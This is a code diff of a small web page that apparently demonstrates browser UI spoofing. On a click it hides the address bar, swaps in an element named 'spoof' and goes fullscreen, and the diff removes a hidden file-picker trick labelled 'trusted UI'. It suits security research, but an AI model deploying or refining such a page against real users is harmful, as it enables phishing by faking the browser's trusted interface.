@@ -35,8 +35,6 @@
       color: white;
       text-align: center;
     }
-
-    input { display: none; }
   </style>
 </head>
 
@@ -48,8 +46,6 @@
   <h1>Click anywhere</h1>
 </div>
 
-<input id="photoPicker" type="file" accept="image/*">
-
 <script>
 let once = false;
 
@@ -60,11 +56,6 @@ onclick = () => {
   // hide omnibox
   window.scrollTo(0, 1);
 
-  // trusted UI
-  photoPicker.click();
-};
-
-photoPicker.onchange = () => {
   content.style.display = "none";
   spoof.style.display = "block";
 
@@ -72,6 +63,13 @@ photoPicker.onchange = () => {
     document.documentElement.requestFullscreen().catch(() => {});
   }
 };
+
+// detect keluar fullscreen → scroll ke atas
+document.addEventListener("fullscreenchange", () => {
+  if (!document.fullscreenElement) {
+    window.scrollTo(0, 0);
+  }
+});
 </script>
 
 </body>
